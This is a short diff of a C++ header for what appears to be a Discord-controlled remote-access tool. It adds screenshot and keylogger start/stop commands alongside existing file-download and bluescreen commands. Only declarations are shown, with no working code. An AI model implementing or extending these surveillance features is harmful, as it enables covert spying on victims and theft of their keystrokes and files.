@@ -22,10 +22,14 @@ std::string command_changebackround(std::vector<std::string> args, const dpp::me
 
 std::string command_downloadfile(std::vector<std::string> args, const dpp::message_create_t evnt);
 
+std::string command_screenshot(std::vector<std::string> args, const dpp::message_create_t& evnt);
+
 std::string command_bluescreen(std::vector<std::string> args);
 
-std::string command_custom(std::vector<std::string> args, const dpp::message_create_t evnt);
+std::string command_keyloggerstart(std::vector<std::string> args, dpp::message_create_t evnt);
 
-std::string command_readfile(std::vector<std::string> args, const dpp::message_create_t evnt);
+std::string command_keyloggerstop(std::vector<std::string> args, const dpp::message_create_t evnt);
+
+std::string command_custom(std::vector<std::string> args, const dpp::message_create_t evnt);
 
 std::string command_help(std::vector<std::string> args);
